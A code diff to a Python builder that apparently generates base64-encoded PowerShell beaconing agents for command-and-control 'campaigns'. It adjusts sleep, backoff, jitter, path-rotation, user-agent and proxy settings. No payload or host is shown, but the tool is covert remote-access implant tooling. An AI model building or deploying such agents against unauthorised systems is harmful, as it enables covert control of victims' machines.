@@ -33,12 +33,20 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
     beacon_interval = agent_config.get('beacon_period', 5)
     jitter_percentage = agent_config.get('jitter_percentage', 20)
     max_failures = agent_config.get('max_failures_before_fallback', 3)
-    max_backoff = agent_config.get('max_backoff_time', 300)
-    max_sleep_time = agent_config.get('max_sleep_time', 600)
+    max_backoff = agent_config.get('max_backoff_time', 10)
+    
+    # Random sleep is now optional
+    random_sleep_enabled = agent_config.get('random_sleep_enabled', False)
+    max_sleep_time = agent_config.get('max_sleep_time', 10)
+    
+    # Convert booleans to PowerShell format
+    random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
+    
     user_agent = agent_config.get('user_agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
     username = agent_config.get('username', "")
     password = agent_config.get('password', "")
-    proxy_enabled = "$true" if agent_config.get('proxy_enabled', False) else "$false"
+    proxy_enabled = agent_config.get('proxy_enabled', False)
+    proxy_enabled_ps = "$true" if proxy_enabled else "$false"
     proxy_type = agent_config.get('proxy_type', "system")
     proxy_server = agent_config.get('proxy_server', "")
     proxy_port = agent_config.get('proxy_port', "")
@@ -56,11 +64,12 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         jitter_percentage=jitter_percentage,
         max_failures=max_failures,
         max_backoff=max_backoff,
+        random_sleep_enabled=random_sleep_enabled_ps,
         max_sleep_time=max_sleep_time,
         user_agent=user_agent,
         username=username,
         password=password,
-        proxy_enabled=proxy_enabled,
+        proxy_enabled=proxy_enabled_ps,
         proxy_type=proxy_type,
         proxy_server=proxy_server,
         proxy_port=proxy_port
@@ -147,6 +156,13 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         except Exception as e:
             print(f"Warning: Could not load path rotation state: {e}")
     
+    # Convert boolean values to PowerShell format
+    random_sleep_enabled = agent_config.get("random_sleep_enabled", False)
+    random_sleep_enabled_ps = "$true" if random_sleep_enabled else "$false"
+    
+    proxy_enabled = agent_config.get("proxy_enabled", False)
+    proxy_enabled_ps = "$true" if proxy_enabled else "$false"
+    
     # Generate agent code using templates with additional parameters
     agent_ps1 = generate_from_templates(
         server_address=server_address,
@@ -159,12 +175,13 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         beacon_interval=agent_config.get("beacon_period", 5),
         jitter_percentage=agent_config.get("jitter_percentage", 20),
         max_failures=agent_config.get("max_failures_before_fallback", 3),
-        max_backoff=agent_config.get("max_backoff_time", 300),
-        max_sleep_time=agent_config.get("max_sleep_time", 600),
+        max_backoff=agent_config.get("max_backoff_time", 10),
+        random_sleep_enabled=random_sleep_enabled_ps,
+        max_sleep_time=agent_config.get("max_sleep_time", 10),
         user_agent=agent_config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"),
         username=agent_config.get("username", ""),
         password=agent_config.get("password", ""),
-        proxy_enabled="$true" if agent_config.get("proxy_enabled", False) else "$false",
+        proxy_enabled=proxy_enabled_ps,
         proxy_type=agent_config.get("proxy_type", "system"),
         proxy_server=agent_config.get("proxy_server", ""),
         proxy_port=agent_config.get("proxy_port", "")
@@ -215,7 +232,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         f"7. Beacon Configuration:\n"
         f"   - Interval: {agent_config.get('beacon_period', 5)} seconds\n" 
         f"   - Jitter: {agent_config.get('jitter_percentage', 20)}%\n"
-        f"   - Max Sleep Time: {agent_config.get('max_sleep_time', 600)} seconds\n"
+        f"   - Random Sleep: {'Enabled' if random_sleep_enabled else 'Disabled'}\n"
+        f"   - Max Sleep Time: {agent_config.get('max_sleep_time', 10)} seconds\n"
         f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
         f"   - Rotation Interval: {rotation_interval} seconds\n"
         f"8. Proxy Settings:\n"
@@ -240,8 +258,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
 def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
                            beacon_interval, jitter_percentage, max_failures, max_backoff,
-                           max_sleep_time=600, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                           username="", password="", proxy_enabled="false", proxy_type="system",
+                           random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                           username="", password="", proxy_enabled="$false", proxy_type="system",
                            proxy_server="", proxy_port=""):
     """Generate the PowerShell agent code from templates with all the new options"""
     
@@ -284,6 +302,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
     agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
     agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
     agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
+    agent_code = agent_code.replace("{{RANDOM_SLEEP_ENABLED}}", random_sleep_enabled)
     agent_code = agent_code.replace("{{MAX_SLEEP_TIME}}", str(max_sleep_time))
     agent_code = agent_code.replace("{{USER_AGENT}}", user_agent)
     agent_code = agent_code.replace("{{USERNAME}}", username)
